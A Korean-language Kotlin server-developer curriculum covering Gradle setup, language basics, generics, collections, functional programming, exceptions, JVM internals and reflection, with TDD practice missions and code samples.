# Kotlin 미드~시니어 서버 개발자 양성 커리큘럼

> **목표:** JetBrains "Programming in Kotlin" 전 과정 + NEXTSTEP 실습 미션을 통해  
> 미드~시니어 레벨 서버 개발자 역량을 체계적으로 쌓는다.

---

## 참고 자료

### JetBrains "Programming in Kotlin" 공식 슬라이드

| # | 주제 | 링크 |
|---|---|---|
| 1 | Introduction to Kotlin | https://docs.google.com/presentation/d/11mYc_tt2c7qw72i8gaQ9vePTcd0F0LbZCS6ep9PFG28/edit |
| 2 | Object-Oriented Programming | https://docs.google.com/presentation/d/1hZTaQ1gdStte2aeQU78UmpVzpKErdeOCRQPOYH2p3DI/edit |
| 3 | Generics | https://docs.google.com/presentation/d/1n8rTULotZHei3ktajyupwRpKdPDACBAZeBo2GqwYhHY/edit |
| 4 | Collections and co. | https://docs.google.com/presentation/d/1RvnmqWM-Q_hYi1dWwqN1ieK2pZAwlThOkLI9j5yqViU/edit |
| 5 | Functional Programming | https://docs.google.com/presentation/d/1R7n5plsn5caGpYrI9omxbEuX6pazjDj2d9X0IQ2AdLg/edit |
| 6 | Parallel & Concurrent Programming | https://docs.google.com/presentation/d/19C10TZM1kT0AzEjqSfLZs1_HC3Ye0E9h6muVDikl4uo/edit |
| 7 | Asynchronous Programming (Coroutines) | https://docs.google.com/presentation/d/1_F9CVHdbXoRagLUpBGjpwS9DDbzB2K-Cfv4Pz5qKza4/edit |
| 8 | Exceptions | https://docs.google.com/presentation/d/1o0c25j-5UKE1Qw94W26numHxMU_xL0uFchCWJfaOuUc/edit |
| 9 | Build Systems | https://docs.google.com/presentation/d/1njTh1B3wC2jycgqQAIdiQ6oTmAnClVgYyoW_KNoZ0fs/edit |
| 10 | The JVM & Kotlin Compiler | https://docs.google.com/presentation/d/1WT0kVeLpZ8-cS1211oXVvjPesgPgTJxIuIJHkU6-49k/edit |
| 11 | Reflection (JVM) | https://docs.google.com/presentation/d/1hZTaQ1gdStte2aeQU78UmpVzpKErdeOCRQPOYH2p3DI/edit |
| 12 | Backend Development Basics | https://docs.google.com/presentation/d/1njTh1B3wC2jycgqQAIdiQ6oTmAnClVgYyoW_KNoZ0fs/edit |

추천 교재: *Kotlin in Action, Second Edition* — Roman Elizarov 외, Manning, 2022

---

## 전체 커리큘럼 구조

```
Phase 0: 빌드 시스템              (Gradle, 의존성 관리, Version Catalog)
Phase 1: Kotlin 언어 기초         (Introduction → OOP → Generics → Collections → FP → Exceptions)
         └─ 미션: 숫자야구 / 자동차경주 / 좌표계산기
Phase 2: JVM 내부 구조            (컴파일러 파이프라인, GC, JIT, Reflection)
Phase 3: 동시성                   (스레드, 락, JMM, @Volatile, 동시성 컬렉션, 코루틴)
         └─ 미션: RSS리더 / 코루틴레이싱
Phase 4: 백엔드 개발              (HTTP, REST, Spring Boot, JPA)
         └─ 미션: 블랙잭 / 로또
```

---

## 교육 원칙

### 1. WHY → WHAT → HOW 순서

코드부터 보여주지 않는다. 반드시 이 순서로 진행한다:

1. **왜 이게 문제인가** — 나쁜 코드 예시로 시작
2. **무엇을 만들 것인가** — 개념 설명
3. **어떻게 만드는가** — TDD로 구현

예) sealed class 설명 전에 `if/when` 분기의 문제점을 먼저 보여준다.

### 2. Trade-off 반드시 설명

개념 소개 시 항상 세 가지를 함께 설명한다:
- 이 상황에서 왜 이 선택인가
- 언제 이게 유리한가
- 언제 이게 과하거나 다른 선택이 더 나은가

### 3. TDD Red → Green → Refactor 철저히

- 테스트 없이 프로덕션 코드 절대 작성 금지
- 학습자가 직접 타이핑 (복붙 금지)
- 각 단계에서 실제로 실행해서 RED/GREEN 확인 후 진행

### 4. Idiomatic Kotlin 준수

- `val` 우선, `var` 최소화
- `!!` 절대 금지 — `?.`, `?:`, `checkNotNull` 활용
- `if/when/try-catch` 표현식으로 사용
- `let`, `also`, `apply`, `run` 적절히 활용
- `require`/`check`/`error`로 검증

### 5. YAGNI 엄수

지금 쓰이지 않는 코드는 넣지 않는다.

---

## Phase Pre: Java 온램프 (TypeScript 개발자용)

> **대상:** TS는 익숙하지만 JVM은 처음. **목표는 작성이 아니라 "읽기"** — 남이 쓴 Java 코드를
> 읽고 의미를 이해하는 수준. 깊이 안 판다. 모든 개념을 TS에 매핑한다.

### Pre-1. JVM·생태계 (TS 런타임과 대비)
- JS는 V8 같은 엔진 + 이벤트 루프, Java/Kotlin은 **JVM**(바이트코드 실행) 위에서 동작
- **JDK**(개발도구+컴파일러) ⊃ **JRE**(실행환경) ⊃ **JVM**(실행기)
- TS `tsc` → JS 트랜스파일과 대비: `.java`/`.kt` → `.class`(바이트코드) → JVM 실행
- 패키지 매니저: npm/package.json ↔ Gradle/Maven (Phase 0에서 상세)

### Pre-2. Java 문법 — TS 매핑으로 빠르게
| TypeScript | Java | 비고 |
|---|---|---|
| `let x: number = 1` | `int x = 1;` | Java는 원시타입(int/long/double)과 박싱타입(Integer) 구분 |
| `const s: string` | `final String s` | `final` = 재할당 금지 (TS `const`) |
| `x: string \| null` | `String x` (기본 nullable) | Java는 null 안전성 없음 → NPE 위험. Kotlin이 해결 |
| `interface`/`class` | `interface`/`class` | Java는 명목적 타이핑 (TS 구조적과 다름) |
| `arr.map(...)` | Stream API `.stream().map(...)` | Java 8+ |

### Pre-3. Java만의 관용구 (남 코드 읽기 위해)
- **체크 예외(checked exception):** 메서드가 `throws IOException` 선언, 호출자가 try-catch 강제. (TS엔 없음, Kotlin도 제거)
- **getter/setter 보일러플레이트:** `private` 필드 + `getX()`/`setX()`. (Kotlin은 프로퍼티로 자동)
- **제네릭 소거(type erasure):** 런타임에 `List<String>`의 `String`이 사라짐. (TS 제네릭도 컴파일 후 소거 — 친숙)
- **`null` 천지:** 어디든 null 가능 → NPE. Kotlin의 `?`/`?:`가 왜 나왔는지 여기서 체감.

### Pre-4. "Kotlin은 이걸 왜 바꿨나" (Phase 1 다리)
Java를 읽으며 느낀 불편(null 위험, 보일러플레이트, 체크예외)을 Kotlin이 어떻게 푸는지 미리 한 줄씩 예고.
→ 본격 학습은 **Phase 1부터 Kotlin으로** 진행.

---

## Phase 0: 빌드 시스템

> **출처:** JetBrains *Build Systems* 슬라이드  
> 모든 Phase 진입 전에 프로젝트를 제대로 설정하는 법부터 익힌다.

### 0-0. 환경 세팅 (처음 시작하는 경우)

#### JDK 설치

```bash
# macOS — Homebrew로 설치
brew install --cask temurin@21

# 설치 확인
java -version
# openjdk version "21.x.x" ...
```

> **왜 21인가:** LTS(장기 지원) 버전이고, 현재 Spring Boot 3.x의 최소 요구 버전이 17이나 21이 사실상 표준이다.

#### IntelliJ IDEA 설치

1. [JetBrains 공식 사이트](https://www.jetbrains.com/idea/download/) → **Community Edition** 다운로드 (무료)
2. 설치 후 실행

> Community Edition으로 Kotlin + Spring Boot 개발 모두 가능하다.

#### 프로젝트 생성

IntelliJ에서 새 프로젝트 만들기:

```
File → New Project
  ├── Language: Kotlin
  ├── Build system: Gradle
  ├── Gradle DSL: Kotlin   ← build.gradle.kts (Groovy 아닌 Kotlin 선택)
  └── JDK: 21
```

생성 직후 자동으로 만들어지는 파일들:

```
kotlin-baseball/
├── gradlew              ← 팀원 환경 통일용 래퍼 스크립트 (반드시 커밋)
├── gradlew.bat          ← Windows용
├── gradle/
│   └── wrapper/
│       └── gradle-wrapper.properties   ← Gradle 버전 명시
├── build.gradle.kts     ← 의존성/플러그인 설정
├── settings.gradle.kts  ← 프로젝트 이름
└── src/
    ├── main/kotlin/     ← 프로덕션 코드
    └── test/kotlin/     ← 테스트 코드
```

#### Kotest 의존성 추가

`build.gradle.kts`를 아래와 같이 수정:

```kotlin
plugins {
    kotlin("jvm") version "2.1.0"
}

group = "org.example"
version = "1.0-SNAPSHOT"

repositories {
    mavenCentral()
}

dependencies {
    testImplementation(kotlin("test"))
    testImplementation("io.kotest:kotest-runner-junit5:5.8.1")
    testImplementation("io.kotest:kotest-assertions-core:5.8.1")
}

tasks.test {
    useJUnitPlatform()
}

kotlin {
    jvmToolchain(21)
}
```

수정 후 IntelliJ 우측 Gradle 패널 → 🔄 (Reload) 클릭. 의존성이 다운로드된다.

#### 첫 테스트 실행 확인

`src/test/kotlin/SampleTest.kt` 파일 생성:

```kotlin
import io.kotest.core.spec.style.StringSpec
import io.kotest.matchers.shouldBe

class SampleTest : StringSpec({
    "1 + 1은 2다" {
        (1 + 1) shouldBe 2
    }
})
```

```bash
./gradlew test
# BUILD SUCCESSFUL 뜨면 환경 세팅 완료
```

> 이 테스트가 GREEN이면 Phase 1으로 넘어갈 준비가 된 것이다.

---

### 프로젝트 구조

```
kotlin-baseball/
├── gradle/
│   └── wrapper/
│       ├── gradle-wrapper.jar
│       └── gradle-wrapper.properties    ← 버전 고정
├── gradlew                              ← 래퍼 스크립트 (커밋 필수)
├── gradlew.bat
├── gradle/libs.versions.toml            ← Version Catalog
├── settings.gradle.kts
└── build.gradle.kts
```

### Gradle Wrapper

**왜 Wrapper를 쓰는가:** 팀원마다 Gradle 버전이 달라 "내 PC에서만 빌드됨" 문제를 방지한다.

```properties
# gradle/wrapper/gradle-wrapper.properties
distributionUrl=https\://services.gradle.org/distributions/gradle-8.7-bin.zip
```

```bash
# Wrapper가 선언된 버전을 자동 다운로드 후 실행
./gradlew build
```

### 플러그인 종류

```kotlin
plugins {
    // Core 플러그인: ID만 써도 됨 (Gradle이 내장 제공)
    application
    java

    // Community 플러그인: 전체 ID 명시 필요
    kotlin("jvm") version "2.1.0"
    id("org.springframework.boot") version "3.3.0"

    // apply false: 선언만 하고 서브프로젝트에서 선택적 적용
    id("io.spring.dependency-management") version "1.1.0" apply false
}
```

### 의존성 관리

```kotlin
repositories {
    mavenCentral()                              // 공개 Maven Central
    maven {
        url = uri("https://my.company.repo")
        credentials { username = "..."; password = "..." }
    }
    flatDir { dirs("libs") }                    // 로컬 JAR 파일
}

dependencies {
    // 컴파일 + 런타임, API는 외부에 노출 안 됨
    implementation("org.jetbrains.kotlin:kotlin-stdlib:2.1.0")

    // API 노출 (라이브러리 개발 시)
    api("com.google.guava:guava:32.1.3-jre")

    // 테스트 전용
    testImplementation(kotlin("test"))
    testImplementation("io.kotest:kotest-runner-junit5:5.8.1")
    testImplementation("io.kotest:kotest-assertions-core:5.8.1")

    // 서브프로젝트 참조
    implementation(project(":domain"))

    // 소스 제어 의존성
    // sourceControl { gitRepository(...) { producesModule(...) } }
}
```

**`implementation` vs `api` 차이:**
- `implementation`: 이 모듈을 사용하는 모듈에 해당 의존성 노출 안 됨 (빌드 캡슐화)
- `api`: 노출됨 — 라이브러리 개발 시에만 사용

### Version Catalog

**왜 필요한가:** 멀티모듈에서 의존성 버전을 한 곳에서 관리한다.

```toml
# gradle/libs.versions.toml
[versions]
kotlin = "2.1.0"
kotest = "5.8.1"
spring-boot = "3.3.0"

[libraries]
kotlin-stdlib = { module = "org.jetbrains.kotlin:kotlin-stdlib", version.ref = "kotlin" }
kotest-runner = { module = "io.kotest:kotest-runner-junit5", version.ref = "kotest" }
kotest-assertions = { module = "io.kotest:kotest-assertions-core", version.ref = "kotest" }

[plugins]
kotlin-jvm = { id = "org.jetbrains.kotlin.jvm", version.ref = "kotlin" }
spring-boot = { id = "org.springframework.boot", version.ref = "spring-boot" }
```

```kotlin
// build.gradle.kts에서 사용
dependencies {
    implementation(libs.kotlin.stdlib)
    testImplementation(libs.kotest.runner)
    testImplementation(libs.kotest.assertions)
}
```

### Gradle Properties 우선순위

```
1. CLI 플래그: ./gradlew build -Penv=prod
2. 프로젝트 local: ./gradle.properties
3. Gradle 홈:     ~/.gradle/gradle.properties
4. Gradle 내장 프로퍼티
5. 환경 변수
```

```kotlin
// build.gradle.kts에서 프로퍼티 읽기
val env: String? by project   // -Penv=prod 로 주입
```

### 학습용 build.gradle.kts (이 프로젝트)

```kotlin
plugins {
    kotlin("jvm") version "2.1.0"
}

group = "org.example"
version = "1.0-SNAPSHOT"

repositories {
    mavenCentral()
}

dependencies {
    testImplementation(kotlin("test"))
    testImplementation("io.kotest:kotest-runner-junit5:5.8.1")
    testImplementation("io.kotest:kotest-assertions-core:5.8.1")
}

tasks.test {
    useJUnitPlatform()
}

kotlin {
    jvmToolchain(21)
}
```

---

## Phase 1: Kotlin 언어 기초

> **출처:** JetBrains Topics 1–5, 8  
> NEXTSTEP 미션 세 개를 TDD로 진행하면서 언어 기초를 체득한다.

### 1-A. Introduction to Kotlin

**Kotlin이란:**
- JVM 바이트코드로 컴파일, Java와 100% 상호운용
- 간결성, 안정성(Null 안전), 표현력이 목표
- Android 공식 언어, 서버(Spring), 멀티플랫폼 지원

**핵심 문법:**

```kotlin
// 변수: val(불변), var(가변)
val name: String = "Arnold"
var count = 0   // 타입 추론

// Null 안전
val nullable: String? = null
val len = nullable?.length ?: 0   // Elvis 연산자

// 문자열 템플릿
println("Hello, $name! Length: ${name.length}")

// 제어 흐름 — 표현식으로 사용 가능
val label = if (count > 0) "양수" else "비양수"

val result = when (count) {
    0    -> "영"
    in 1..9  -> "한 자리"
    else -> "두 자리 이상"
}

// 함수
fun add(a: Int, b: Int): Int = a + b   // 단일 표현식
fun greet(name: String = "World") = println("Hello, $name!")

// 범위 함수
val str = buildString {
    append("Hello")
    append(", World")
}
```

**TypeScript ↔ Kotlin 비교:**

| TypeScript | Kotlin |
|---|---|
| `const x = 1` | `val x = 1` |
| `let x = 1` | `var x = 1` |
| `string \| null` | `String?` |
| `x?.length ?? 0` | `x?.length ?: 0` |
| 런타임 null 체크 필요 | 컴파일 타임에 강제 |

---

### 1-B. Object-Oriented Programming

**클래스 기초:**

```kotlin
// 기본 클래스 (기본적으로 final — 상속 불가)
class Person(val name: String, val age: Int) {
    fun greet() = println("Hi, I'm $name")
}

// data class — equals/hashCode/copy/toString 자동 생성
data class Point(val x: Int, val y: Int)
val p1 = Point(1, 2)
val p2 = p1.copy(y = 3)   // (1, 3)

// object — 싱글톤
object Config {
    val maxRetry = 3
}

// companion object — Java의 static과 유사
class Lotto {
    companion object {
        fun generate(): Lotto = Lotto(...)
    }
}
```

**상속 관계 수식어 비교:**

| 수식어 | 인스턴스 생성 | 상속 | 자식 위치 제한 |
|---|---|---|---|
| `class` | 가능 | 불가 (기본 final) | 없음 |
| `open class` | 가능 | 가능 | 없음 |
| `abstract class` | 불가 | 가능 | 없음 |
| `sealed class` | 불가 | 가능 | 같은 파일만 |

**interface vs abstract class:**

```kotlin
// interface: 행동 계약, 다중 구현 가능, 공통 로직 없음
interface Measurable {
    fun measure(): Double
}

// abstract class: 공통 로직 + 구현 강제, 단일 상속
abstract class Shape {
    abstract fun area(): Double
    fun describe() = "넓이: ${area()}"   // 공통 로직
}
```

**언제 무엇을 쓰는가:**
- 케이스가 고정됨 → **sealed class**
- 외부 확장이 필요함 → **interface**
- 공통 로직 공유 + 상속 → **abstract class**

**sealed class:**
```kotlin
// TypeScript union type의 클래스 버전
// type Fuel = "Gasoline" | "Diesel" | "LPG"

sealed class Fuel {
    abstract val pricePerLiter: Int
    object Gasoline : Fuel() { override val pricePerLiter = 1700 }
    object Diesel   : Fuel() { override val pricePerLiter = 1500 }
    object LPG      : Fuel() { override val pricePerLiter = 900  }
}

// when에 else 없어도 됨 — 컴파일러가 모든 케이스 보장
fun describe(fuel: Fuel): String = when (fuel) {
    is Fuel.Gasoline -> "휘발유"
    is Fuel.Diesel   -> "경유"
    is Fuel.LPG      -> "LPG"
}
```

**검증 함수:**

| 함수 | 용도 | 예외 |
|---|---|---|
| `require(condition)` | 파라미터 검증 | `IllegalArgumentException` |
| `check(condition)` | 객체 상태 검증 | `IllegalStateException` |
| `error(msg)` | 도달 불가 코드 | `IllegalStateException` |

**Extension functions:**
```kotlin
// 기존 클래스에 메서드 추가 (상속 없이)
fun String.isValidEmail(): Boolean = contains("@") && contains(".")
fun Int.isEven(): Boolean = this % 2 == 0

"test@example.com".isValidEmail()  // true
```

---

### 1-C. Generics

**타입 파라미터 기초:**

```kotlin
// 제네릭 함수
fun <T> List<T>.second(): T = this[1]

// 제네릭 클래스
class Box<T>(val value: T) {
    fun <R> transform(f: (T) -> R): Box<R> = Box(f(value))
}

// 상한 경계
fun <T : Comparable<T>> max(a: T, b: T): T = if (a > b) a else b
```

**타입 소거(Type Erasure):**
```kotlin
// JVM에서 런타임에 제네릭 타입 정보가 지워짐
// val list: List<String> → 런타임에는 그냥 List

// 해결책: reified (inline 함수 내에서만 사용 가능)
inline fun <reified T> List<*>.filterIsInstance(): List<T> =
    filter { it is T }.map { it as T }

val strings = listOf(1, "hello", 2, "world").filterIsInstance<String>()
```

**공변성(Variance) — 타입 안전한 상속:**

```kotlin
// out (공변): 읽기만 가능 (Producer)
// List<Dog>를 List<Animal>로 취급 가능
fun printAnimals(animals: List<out Animal>) {
    animals.forEach { println(it.name) }   // 읽기 O
    // animals.add(Cat())                  // 쓰기 X
}

// in (반공변): 쓰기만 가능 (Consumer)
// Comparator<Animal>를 Comparator<Dog>로 취급 가능
fun sortDogs(dogs: MutableList<Dog>, comparator: Comparator<in Dog>) {
    dogs.sortWith(comparator)
}

// 스타 프로젝션: 타입을 모를 때
fun printSize(list: List<*>) = println(list.size)
```

**PECS 원칙:** Producer → `out`, Consumer → `in`

---

### 1-D. Collections

**불변 vs 가변:**
```kotlin
// 불변 (기본값)
val list: List<Int> = listOf(1, 2, 3)
val map: Map<String, Int> = mapOf("a" to 1, "b" to 2)

// 가변
val mutableList: MutableList<Int> = mutableListOf(1, 2, 3)
mutableList.add(4)
```

**핵심 연산:**
```kotlin
val numbers = listOf(1, 2, 3, 4, 5, 6)

// map: 변환
numbers.map { it * 2 }              // [2, 4, 6, 8, 10, 12]

// filter: 조건 필터
numbers.filter { it % 2 == 0 }     // [2, 4, 6]

// flatMap: 중첩 리스트 평탄화
listOf(listOf(1, 2), listOf(3, 4)).flatMap { it }   // [1, 2, 3, 4]

// groupBy: 그룹핑
numbers.groupBy { if (it % 2 == 0) "짝수" else "홀수" }
// {"홀수": [1,3,5], "짝수": [2,4,6]}

// partition: 두 그룹으로 분리
val (evens, odds) = numbers.partition { it % 2 == 0 }

// reduce / fold
numbers.reduce { acc, n -> acc + n }       // 21
numbers.fold(100) { acc, n -> acc + n }   // 121

// zip: 두 리스트 합치기
listOf("a", "b").zip(listOf(1, 2))   // [("a",1), ("b",2)]

// windowed / chunked
numbers.windowed(3)    // [[1,2,3],[2,3,4],[3,4,5],[4,5,6]]
numbers.chunked(2)     // [[1,2],[3,4],[5,6]]
```

**Sequence — 지연 평가:**
```kotlin
// List: 각 단계에서 중간 컬렉션 생성 (즉시 평가)
val result = (1..1_000_000)
    .filter { it % 2 == 0 }   // 50만개 중간 리스트 생성
    .map { it * 3 }            // 50만개 중간 리스트 생성
    .first()

// Sequence: 원소 하나씩 파이프라인 통과 (지연 평가)
val resultSeq = (1..1_000_000).asSequence()
    .filter { it % 2 == 0 }   // 평가 안 함
    .map { it * 3 }            // 평가 안 함
    .first()                   // 조건 충족하는 첫 원소 찾는 순간만 평가

// Sequence 생성 (무한 수열)
val fibonacci = sequence {
    var cur = 1; var next = 1
    while (true) {
        yield(cur)
        val tmp = next; next = cur + next; cur = tmp
    }
}
fibonacci.take(10).toList()   // [1, 1, 2, 3, 5, 8, 13, 21, 34, 55]
```

**언제 Sequence를 쓰는가:**
- 연산 체인이 3개 이상이고
- 컬렉션 크기가 크거나 무한할 때
- 첫 번째 일치 원소만 필요할 때

---

### 1-E. Functional Programming

**함수 기초:**

함수는 특정 작업을 수행하는 코드 묶음이다. 재사용성을 높이고 유지보수를 편리하게 한다.

```kotlin
// 기본 함수 선언: fun 키워드 + 이름 + 파라미터 + 반환 타입
fun add(a: Int, b: Int): Int {
    return a + b
}

// 단일 표현식이면 = 으로 축약 (반환 타입 추론 가능)
fun add(a: Int, b: Int): Int = a + b
fun add(a: Int, b: Int) = a + b   // 타입 추론

// 기본값 파라미터
fun greet(name: String = "World") = println("Hello, $name!")
greet()           // Hello, World!
greet("Arnold")   // Hello, Arnold!

// 이름 있는 인자 (순서 무관)
fun createUser(name: String, age: Int, email: String) { ... }
createUser(age = 25, email = "a@b.com", name = "Arnold")

// 반환값 없는 함수: Unit (TypeScript의 void)
fun log(message: String): Unit = println(message)
fun log(message: String) = println(message)   // Unit 생략 가능
```

**Kotlin은 1급 함수(First-class Function)를 지원한다:**

함수를 변수에 담거나, 다른 함수에 인자로 전달하거나, 함수에서 반환할 수 있다.

```kotlin
// 함수 타입: (파라미터 타입) -> 반환 타입
val double: (Int) -> Int = { x -> x * 2 }   // 함수를 변수에 저장
val printMsg: (String) -> Unit = { msg -> println(msg) }

double(3)      // 6
printMsg("hi") // hi
```

**람다와 고차함수:**

람다는 이름 없는 익명 함수다. `{ 파라미터 -> 본문 }` 형태로 작성한다.

```kotlin
// 람다: { 파라미터 -> 본문 }
val double: (Int) -> Int = { x -> x * 2 }
val sum: (Int, Int) -> Int = { a, b -> a + b }

// 고차함수: 함수를 인자로 받거나 반환
fun applyTwice(f: (Int) -> Int, x: Int): Int = f(f(x))
applyTwice(double, 3)   // 12

// 마지막 람다는 괄호 밖으로 (trailing lambda)
listOf(1, 2, 3).map { it * 2 }

// 단일 파라미터 → it으로 생략
listOf(1, 2, 3).filter { it > 1 }
```

**함수 참조:**
```kotlin
fun isEven(n: Int): Boolean = n % 2 == 0

// ::함수명 으로 참조
listOf(1, 2, 3, 4).filter(::isEven)   // [2, 4]

// 메서드 참조
listOf("hello", "world").map(String::uppercase)
```

**inline 함수:**
```kotlin
// inline: 컴파일 시 람다 코드를 호출 지점에 복사
// → 람다 객체 생성 오버헤드 없음
inline fun measure(block: () -> Unit): Long {
    val start = System.currentTimeMillis()
    block()
    return System.currentTimeMillis() - start
}

// crossinline: 다른 실행 컨텍스트에서 호출될 람다 (return 금지)
inline fun runAsync(crossinline block: () -> Unit) {
    Thread { block() }.start()
}

// noinline: 특정 람다만 inline 제외 (객체로 전달해야 할 때)
inline fun doWork(action: () -> Unit, noinline onDone: () -> Unit) {
    action()
    scheduleCallback(onDone)   // 객체로 저장해야 하므로 noinline
}
```

**클로저:**
```kotlin
fun makeCounter(): () -> Int {
    var count = 0
    return { ++count }   // count를 캡처
}
val counter = makeCounter()
counter()   // 1
counter()   // 2
```

---

### 1-F. Exceptions

**try-catch는 표현식:**
```kotlin
val result: Int = try {
    Integer.parseInt("abc")
} catch (e: NumberFormatException) {
    -1
}
```

**Kotlin 예외의 특징:**
- 모든 예외가 **unchecked** — Java의 `throws` 선언 불필요
- `Throwable` 계층: `Error` (복구 불가) / `Exception` (복구 가능)

**Nothing 타입:**
```kotlin
// Nothing: 절대 정상 반환하지 않는 함수의 반환 타입
fun fail(msg: String): Nothing = throw IllegalStateException(msg)

// 컴파일러가 이 분기 이후 코드가 없다는 걸 앎
val name = user?.name ?: fail("user must have a name")
println(name.length)   // name이 String임을 컴파일러가 보장
```

**`require` / `check` / `error` 패턴:**
```kotlin
class BankAccount(private var balance: Int) {
    init {
        require(balance >= 0) { "잔액은 0 이상이어야 합니다" }
    }

    fun withdraw(amount: Int) {
        require(amount > 0) { "출금액은 0보다 커야 합니다" }   // 파라미터 검증
        check(balance >= amount) { "잔액 부족" }              // 상태 검증
        balance -= amount
    }
}
```

---

## Phase 1 미션

### 미션 1: 숫자 야구 게임

**목표:** Kotest TDD 사이클 체험, 메소드 분리

**규칙:** 3자리 서로 다른 숫자 맞추기 (스트라이크/볼/아웃)

**핵심 TDD 시작 순서:**
1. `BaseballGame`이 존재한다
2. `guess("123")`가 `HintResult`를 반환한다
3. 3스트라이크 = `GameOver`
4. 잘못된 입력 = `IllegalArgumentException`

---

### 미션 2: 자동차 경주 게임

**목표:** data class, 불변 객체, 의존성 주입(NumberGenerator)

```kotlin
data class Car(val name: String, val position: Int = 0) {
    fun move(number: Int): Car =
        if (number >= 4) copy(position = position + 1) else this
}

class RacingGame(private val cars: List<Car>) {
    fun race(numberGenerator: () -> Int): RacingGame =
        RacingGame(cars.map { it.move(numberGenerator()) })

    fun winners(): List<Car> {
        val maxPos = cars.maxOf { it.position }
        return cars.filter { it.position == maxPos }
    }
}
```

**핵심 개념:**
- `data class` — equals/hashCode/copy/toString 자동 생성
- 불변 객체: `move()`가 새 Car를 반환 (기존 객체 수정 X)
- 난수 생성기를 주입받아 테스트 가능하게 만들기

---

### 미션 3: 좌표계산기

**목표:** interface, abstract class, 다형성

```kotlin
data class Point(val x: Int, val y: Int) {
    init {
        require(x in 0..24) { "x 좌표는 0~24 사이" }
        require(y in 0..24) { "y 좌표는 0~24 사이" }
    }
}

interface Measurable {
    fun measure(): Double
}

class Line(val p1: Point, val p2: Point) : Measurable {
    override fun measure(): Double {
        val dx = (p2.x - p1.x).toDouble()
        val dy = (p2.y - p1.y).toDouble()
        return Math.sqrt(dx * dx + dy * dy)
    }
}

class Triangle(val p1: Point, val p2: Point, val p3: Point) : Measurable {
    override fun measure(): Double {
        val a = Line(p1, p2).measure()
        val b = Line(p2, p3).measure()
        val c = Line(p3, p1).measure()
        val s = (a + b + c) / 2
        return Math.sqrt(s * (s - a) * (s - b) * (s - c))
    }
}
```

---

## Phase 2: JVM 내부 구조

> **출처:** JetBrains *The JVM & Kotlin Compiler* + *Reflection (JVM)* 슬라이드  
> "왜 이렇게 동작하는가"를 이해해야 성능 문제를 진단하고 프레임워크를 제대로 쓸 수 있다.

### 2-A. JVM 메모리 구조와 GC

**힙 구조:**
```
Young Generation
├── Eden Space       ← 새로 생성된 객체
├── Survivor S0      ← GC 생존자 (from)
└── Survivor S1      ← GC 생존자 (to)

Old Generation (Tenured)  ← 오래된 객체
Metaspace                 ← 클래스 메타데이터 (Java 8+)
```

**GC 동작 원리 (Generational Hypothesis):**
> "대부분의 객체는 짧게 살다 죽는다."

1. **Minor GC**: Eden → Survivor (빠름, 자주 발생)
2. **Major GC**: Old Generation 정리 (느림, 드물게 발생)
3. 임계 나이(age threshold) 넘긴 객체만 Old Generation으로 승격

**Serial GC (학습용 프로젝트 기본값):**
- 단일 스레드로 GC 수행
- GC 중 STW(Stop-The-World) 발생
- 소규모 앱에 적합, 프로덕션은 G1GC/ZGC 권장

### 2-B. JIT 컴파일

```
JVM 실행 흐름:
.class 바이트코드 → 인터프리터 (느림) → 핫스팟 감지 → JIT 컴파일 (빠름)
```

**핫스팟 기준:** 메서드가 1,000회 이상 호출되면 JIT이 네이티브 코드로 컴파일

**JIT 최적화 종류:**
- **메서드 인라이닝:** 짧은 메서드 호출을 호출 지점에 복사 → 스택 프레임 오버헤드 제거
- **상수 폴딩:** `val PI = 3.14` → 사용 지점에 `3.14` 직접 삽입
- **탈출 분석:** 힙 대신 스택 할당 가능 여부 판단

**JIT + Reflection 충돌 주의:**
```kotlin
const val PI = 3.14159
// JIT이 PI*PI를 9.8696...으로 인라인화
// Reflection으로 PI 필드를 읽으면 원래 값이 아닌 인라인된 결과를 볼 수 있음
```

### 2-C. Kotlin 컴파일러 파이프라인

```
.kt 소스 파일
    │
    ▼ Parser
Lexer → 토큰 스트림
    └→ PSI/AST 빌더 → CST/AST (구체적 문법 트리)
    │
    ▼ Frontend (Resolution)
FIR (Frontend IR) 생성
    ├─ 타입 추론
    ├─ 이름 해석
    ├─ 진단(에러/경고)
    └─ Desugaring (문법 설탕 제거)
    │
    ▼ Backend
IR (Intermediate Representation) 생성
    └─ IR 최적화
    │
    ▼ Target
JVM 바이트코드 / JS / Native
```

**PSI (Program Structure Interface):**
- IDE용 풍부한 문법 트리 — 공백/주석까지 보존
- IntelliJ IDEA가 리팩토링, 자동완성, 에러 표시에 사용

**FIR Desugaring 예시:**
```kotlin
// 소스 코드
if (condition) doA()

// FIR 내부 표현
when { condition -> doA() }

// ─────────────────────────────
// 소스 코드
for (s in list) process(s)

// FIR 내부 표현
val iter = list.iterator()
while (iter.hasNext()) {
    val s = iter.next()
    process(s)
}

// ─────────────────────────────
// 소스 코드
"Hello, $user!"

// FIR 내부 표현
StringConcatenationCall(
    ConstExpression("Hello, "),
    FunctionCall(user.toString()),
    ConstExpression("!")
)
```

### 2-D. Reflection

**Java Reflection:**
```kotlin
// 메서드 호출
val method = Dog::class.java.methods.find { it.name == "bark" }
method?.invoke(dog)

// private 메서드 접근
val privateMethod = Dog::class.java.getDeclaredMethod("secret")
privateMethod.isAccessible = true   // 접근 허용
privateMethod.invoke(dog)

// static 메서드: null 인스턴스로 호출
val staticMethod = Dog::class.java.getDeclaredMethod("staticHelper")
staticMethod.invoke(null)
```

**Kotlin Reflection (kotlin-reflect 의존성 필요):**
```kotlin
// build.gradle.kts에 추가 필요
// implementation("org.jetbrains.kotlin:kotlin-reflect:2.1.0")

val kClass: KClass<Dog> = dog::class

kClass.memberProperties   // 멤버 프로퍼티
kClass.memberFunctions    // 멤버 함수
kClass.isAbstract         // abstract?
kClass.isData             // data class?
kClass.isFinal            // final?

// 최상위 함수 reflection
::myTopLevelFun.returnType
::myTopLevelFun.parameters

// Java ↔ Kotlin 브릿지
method.kotlinFunction      // Method → KFunction
field.kotlinProperty       // Field → KProperty
```

**내부 구현:** Kotlin 메타데이터는 `@Lkotlin/Metadata` 어노테이션의 protobuf로 저장됨

**Reflection 단점:**
- 이름 기반 조회 → 리팩토링(이름 변경) 시 런타임 에러
- JIT 최적화 방해 → 성능 저하
- 컴파일 타임 검증 없음

> **법칙:** Reflection이 필요 없다면 쓰지 마라. Spring/JUnit 같은 프레임워크가 이미 내부에서 처리한다.

**MethodHandles (JIT 친화적 대안):**
```kotlin
// Reflection보다 JIT 최적화가 잘 됨
val lookup = MethodHandles.publicLookup()
val mh = lookup.findVirtual(Dog::class.java, "bark", MethodType.methodType(String::class.java))
val result = mh.invoke(dog) as String

// private 접근
val privateLookup = MethodHandles.privateLookupIn(Dog::class.java, MethodHandles.lookup())
```

---

